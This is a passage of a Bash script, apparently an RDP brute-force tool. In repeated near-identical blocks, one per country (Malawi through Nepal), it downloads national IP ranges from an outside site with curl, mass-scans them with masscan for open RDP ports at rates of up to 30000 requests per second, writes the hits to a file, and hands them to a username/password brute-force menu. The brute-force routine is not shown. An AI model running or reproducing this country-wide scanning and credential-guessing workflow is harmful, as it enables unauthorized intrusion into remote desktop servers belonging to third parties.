masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "111" ]; then
curl http://ipdiapazon.16mb.com/Malawi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "112" ]; then
curl http://ipdiapazon.16mb.com/Malaysia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "113" ]; then
curl http://ipdiapazon.16mb.com/Maldives.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "114" ]; then
curl http://ipdiapazon.16mb.com/Mali.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "115" ]; then
curl http://ipdiapazon.16mb.com/Malta.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "116" ]; then
curl http://ipdiapazon.16mb.com/Mauritania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "117" ]; then
curl http://ipdiapazon.16mb.com/Mauritius.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "118" ]; then
curl http://ipdiapazon.16mb.com/Mexico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "119" ]; then
curl http://ipdiapazon.16mb.com/Micronesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "120" ]; then
curl http://ipdiapazon.16mb.com/Moldova.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "121" ]; then
curl http://ipdiapazon.16mb.com/Monaco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "122" ]; then
curl http://ipdiapazon.16mb.com/Mongolia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "123" ]; then
curl http://ipdiapazon.16mb.com/Morocco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "124" ]; then
curl http://ipdiapazon.16mb.com/Mozambique.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "125" ]; then
curl http://ipdiapazon.16mb.com/Myanmar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "126" ]; then
curl http://ipdiapazon.16mb.com/Namibia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "127" ]; then
curl http://ipdiapazon.16mb.com/Nauru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "128" ]; then
curl http://ipdiapazon.16mb.com/Nepal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
